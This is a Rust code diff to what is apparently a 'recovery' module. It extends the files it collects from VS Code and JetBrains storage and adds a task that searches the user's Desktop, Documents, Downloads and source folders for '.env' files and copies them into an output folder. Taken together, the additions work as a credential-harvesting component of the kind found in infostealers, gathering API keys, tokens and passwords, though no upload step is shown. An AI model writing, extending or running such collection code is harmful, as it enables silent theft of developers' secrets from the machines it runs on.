@@ -169,6 +169,8 @@ impl DevOpsRecoveryTask {
                 "keybindings.json".into(),
                 "globalStorage".into(),
                 "snippets".into(),
+                "storage.json".into(),
+                "sync".into(),
             ]),
         });
 
@@ -180,10 +182,103 @@ impl DevOpsRecoveryTask {
                 "options".into(),
                 "keymaps".into(),
                 "permanent_id".into(),
+                "cwp.txt".into(),
+                "certificates.xml".into(),
             ]),
         });
 
         Self { specs }
+    }
+}
+
+pub fn devops_extra_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
+    vec![Arc::new(EnvFileDiscoveryTask::new(ctx))]
+}
+
+struct EnvFileDiscoveryTask {
+    roots: Vec<PathBuf>,
+}
+
+impl EnvFileDiscoveryTask {
+    fn new(ctx: &RecoveryContext) -> Self {
+        let mut roots = vec![
+            ctx.home_dir.join("Desktop"),
+            ctx.home_dir.join("Documents"),
+            ctx.home_dir.join("Downloads"),
+        ];
+        // Add common developer source locations
+        let source_roots = ["source", "src", "projects", "work", "dev"];
+        for root_name in source_roots {
+            let path = ctx.home_dir.join(root_name);
+            if path.exists() {
+                roots.push(path);
+            }
+        }
+        roots.retain(|p| p.exists());
+        Self { roots }
+    }
+}
+
+#[async_trait]
+impl RecoveryTask for EnvFileDiscoveryTask {
+    fn label(&self) -> String {
+        "DevOps: .env Discovery".to_string()
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::Other
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let mut artifacts = Vec::new();
+        let dest_root = ctx.output_dir.join("services").join("DevOps").join("Discovery");
+        let _ = fs::create_dir_all(&dest_root).await;
+
+        use walkdir::WalkDir;
+        let mut found_paths = Vec::new();
+
+        for root in &self.roots {
+            let walker = WalkDir::new(root)
+                .max_depth(5)
+                .follow_links(false)
+                .into_iter()
+                .filter_entry(|e| {
+                    let name = e.file_name().to_string_lossy();
+                    !name.starts_with('.') || name == ".env"
+                });
+
+            for entry in walker.filter_map(Result::ok) {
+                if !entry.file_type().is_file() {
+                    continue;
+                }
+                let name = entry.file_name().to_string_lossy();
+                if name == ".env" || name.starts_with(".env.") || name.ends_with(".env") {
+                    if entry.metadata().map(|m| m.len()).unwrap_or(0) < 1024 * 256 {
+                        found_paths.push(entry.path().to_path_buf());
+                    }
+                }
+            }
+        }
+
+        for path in found_paths {
+            let rel_label = path.strip_prefix(&ctx.home_dir)
+                .map(|p| p.display().to_string().replace('\\', "_"))
+                .unwrap_or_else(|_| path.file_name().unwrap().to_string_lossy().to_string());
+            
+            let target = dest_root.join(format!("{}.txt", rel_label));
+            if let Ok(_) = fs::copy(&path, &target).await {
+                 if let Ok(meta) = fs::metadata(&target).await {
+                    artifacts.push(RecoveryArtifact {
+                        label: ".env File".to_string(),
+                        path: target,
+                        size_bytes: meta.len(),
+                        modified: meta.modified().ok(),
+                    });
+                 }
+            }
+        }
+
+        Ok(artifacts)
     }
 }
 
